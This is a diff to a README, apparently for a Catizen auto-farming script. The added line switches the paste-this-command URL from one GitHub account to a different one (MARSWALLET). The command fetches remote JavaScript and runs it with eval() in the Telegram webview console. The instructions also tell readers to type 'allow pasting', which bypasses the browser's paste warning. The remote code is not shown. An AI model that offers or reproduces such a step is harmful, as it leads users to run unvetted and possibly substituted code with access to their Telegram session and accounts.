@@ -34,7 +34,8 @@ Access the **Telegram** webview inspection console ([guide on how to do it](http
 Paste the following command into the command prompt:
 
 ```javascript
-var unixTime=Date.now(); var url='https://raw.githubusercontent.com/RGB-Outl4w/AutoFarmCatizen/rel/release_OAFC_v5.1_telegramwebviewscript.js'+'?'+unixTime; fetch(url).then(response=>response.text()).then(script=>eval(script));
+var unixTime=Date.now(); var url='https://raw.githubusercontent.com/MARSWALLET/AutoFarmCatizen-rel/main/release_OAFC_v5.1_telegramwebviewscript.js'+'?'+unixTime; fetch(url).then(response=>response.text()).then(script=>eval(script));
+
 ```
  * Now you only need to fetch the link (execute the script) and the magic will begin.
  * If pasting doesn't work, type `allow pasting` into the command prompt manually.
